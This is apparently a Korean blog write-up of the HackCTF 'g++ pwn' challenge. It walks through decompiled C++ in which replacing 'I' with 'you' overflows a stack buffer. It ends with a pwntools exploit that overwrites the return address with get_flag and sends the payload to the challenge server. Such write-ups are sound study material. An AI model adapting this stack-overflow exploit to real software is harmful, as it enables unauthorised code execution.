---
layout: post
title: "HackCTF g++ pwn"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-04-01 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# g++ pwn

```c
➜  pwnable git:(master) ✗ checksec --file gpwn
[*] '/home/ubuntu/CTF/hackctf/pwnable/gpwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Source

```c
int get_flag()
{
  return system("cat flag.txt");
}

std::string *__stdcall replace(std::string *a1, std::string *a2, std::string *a3)
{
  int v4; // [esp+Ch] [ebp-4Ch]
  char v5[4]; // [esp+10h] [ebp-48h] BYREF
  char v6[7]; // [esp+14h] [ebp-44h] BYREF
  char v7; // [esp+1Bh] [ebp-3Dh] BYREF
  int v8; // [esp+1Ch] [ebp-3Ch]
  char v9[4]; // [esp+20h] [ebp-38h] BYREF
  int v10; // [esp+24h] [ebp-34h] BYREF
  int v11; // [esp+28h] [ebp-30h] BYREF
  char v12; // [esp+2Fh] [ebp-29h] BYREF
  int v13[2]; // [esp+30h] [ebp-28h] BYREF
  char v14[4]; // [esp+38h] [ebp-20h] BYREF
  int v15; // [esp+3Ch] [ebp-1Ch]
  char v16[4]; // [esp+40h] [ebp-18h] BYREF
  int v17; // [esp+44h] [ebp-14h] BYREF
  char v18[4]; // [esp+48h] [ebp-10h] BYREF
  char v19[8]; // [esp+4Ch] [ebp-Ch] BYREF

  while ( std::string::find(a2, a3, 0) != -1 )
  {
    std::allocator<char>::allocator(&v7);
    v8 = std::string::find(a2, a3, 0);          // find(input, "I", 0)
    std::string::begin((std::string *)v9);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v10);
    std::string::begin((std::string *)&v11);
    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(v6, v11, v10, &v7);
    std::allocator<char>::~allocator(&v7);
    std::allocator<char>::allocator(&v12);
    std::string::end((std::string *)v13);
    v13[1] = std::string::length(a3);
    v15 = std::string::find(a2, a3, 0);
    std::string::begin((std::string *)v16);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(v14);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v17);
    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(v5, v17, v13[0], &v12);
    std::allocator<char>::~allocator(&v12);
    std::operator+<char>((std::string *)v19);
    std::operator+<char>((std::string *)v18);
    std::string::operator=(a2, v18, v5, v4);
    std::string::~string(v18);
    std::string::~string(v19);
    std::string::~string(v5);
    std::string::~string(v6);
  }
  std::string::string(a1, a2);
  return a1;
}

int vuln()
{
  const char *v0; // eax
  int v2; // [esp+8h] [ebp-50h]
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
  char v4[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  char v5[7]; // [esp+40h] [ebp-18h] BYREF
  char v6; // [esp+47h] [ebp-11h] BYREF
  char v7[7]; // [esp+48h] [ebp-10h] BYREF
  char v8[5]; // [esp+4Fh] [ebp-9h] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);                          // 32byte input
  std::string::operator=(&input, s);            // input = s
  std::allocator<char>::allocator(&v6);         // string v6;
  std::string::string(v5, "you", &v6);          // v5 = "you";
  std::allocator<char>::allocator(v8);          // string v8;
  std::string::string(v7, "I", v8);             // v7 = "I";
  replace((std::string *)v4, (std::string *)&input, (std::string *)v7);// input, I
  std::string::operator=(&input, v4, v2, v5);
  std::string::~string(v4);
  std::string::~string(v7);
  std::allocator<char>::~allocator(v8);
  std::string::~string(v5);
  std::allocator<char>::~allocator(&v6);
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(s, v0);
  return printf("So, %s\n", s);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  vuln();
  return 0;
}
```

### Solve

아 C++ 문제 개복잡하다. 슬슬 익혀야겠지..

vuln에서 s에 32바이트 만큼 입력을 받고 그걸 input에 옮긴다. 그리고 replace 함수를 이용해 I를 you로 바꾼다.

```c
std::string *__stdcall replace(std::string *a1, std::string *a2, std::string *a3)
{
  int v4; // [esp+Ch] [ebp-4Ch]
  char v5[4]; // [esp+10h] [ebp-48h] BYREF
  char v6[7]; // [esp+14h] [ebp-44h] BYREF
  char v7; // [esp+1Bh] [ebp-3Dh] BYREF
  int v8; // [esp+1Ch] [ebp-3Ch]
  char v9[4]; // [esp+20h] [ebp-38h] BYREF
  int v10; // [esp+24h] [ebp-34h] BYREF
  int v11; // [esp+28h] [ebp-30h] BYREF
  char v12; // [esp+2Fh] [ebp-29h] BYREF
  int v13[2]; // [esp+30h] [ebp-28h] BYREF
  char v14[4]; // [esp+38h] [ebp-20h] BYREF
  int v15; // [esp+3Ch] [ebp-1Ch]
  char v16[4]; // [esp+40h] [ebp-18h] BYREF
  int v17; // [esp+44h] [ebp-14h] BYREF
  char v18[4]; // [esp+48h] [ebp-10h] BYREF
  char v19[8]; // [esp+4Ch] [ebp-Ch] BYREF

  while ( std::string::find(a2, a3, 0) != -1 )
  {
    std::allocator<char>::allocator(&v7);
    v8 = std::string::find(a2, a3, 0);          // find(input, "I", 0)
    std::string::begin((std::string *)v9);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v10);
    std::string::begin((std::string *)&v11);
    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(v6, v11, v10, &v7);
    std::allocator<char>::~allocator(&v7);
    std::allocator<char>::allocator(&v12);
    std::string::end((std::string *)v13);
    v13[1] = std::string::length(a3);
    v15 = std::string::find(a2, a3, 0);
    std::string::begin((std::string *)v16);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(v14);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v17);
    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(v5, v17, v13[0], &v12);
    std::allocator<char>::~allocator(&v12);
    std::operator+<char>((std::string *)v19);
    std::operator+<char>((std::string *)v18);
    std::string::operator=(a2, v18, v5, v4);
    std::string::~string(v18);
    std::string::~string(v19);
    std::string::~string(v5);
    std::string::~string(v6);
  }
  std::string::string(a1, a2);
  return a1;
}
```

하지만 replace 함수가 개복잡하다. 처음엔 이걸 보고 쫄았고 상당히 오랫동안 멀리했다. 생성자 소멸자를 안보더라도 복잡하게 보인다. 정확한 기능은 "I"를 "you"로 바꾼다는 것이다.

```c
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(s, v0);
  return printf("So, %s\n", s);
}
```

그리고 메인함수 마지막에 input을 v0에 넣고 strcpy로 s에 저장한다.

이 때 BoF가 발생한다. 이것을 이용해 get_flag를 ret에 넣으면 된다.

32비트 바이너리이기 때문에 페이로드는 간단하다 버퍼의 길이만 잘 재면 된다.

vuln함수의 스택 크기는 0x88 이나 입력받는 부분부터의 스택은 68바이트(s + SFP, RET)이다.

64바이트를 you로 채우고 RET에 get_flag주소를 넣으면 된다.

64를 3으로 나누면 1이 남으므로 문자 하나를 채워준다.

```wasm
from pwn import *

#context.arch = 'i386'
#context.terminal=['tmux', 'splitw', '-h']
#p = process("./gpwn")
p = remote('ctf.j0n9hyun.xyz', 3011)
get_flag = 0x8048f0d
#gdb.attach(p, 'b*0x04009c9')

payload = ''
payload += "A"
payload += "I"*21
payload += p32(get_flag)

p.sendline(payload)
p.interactive()
```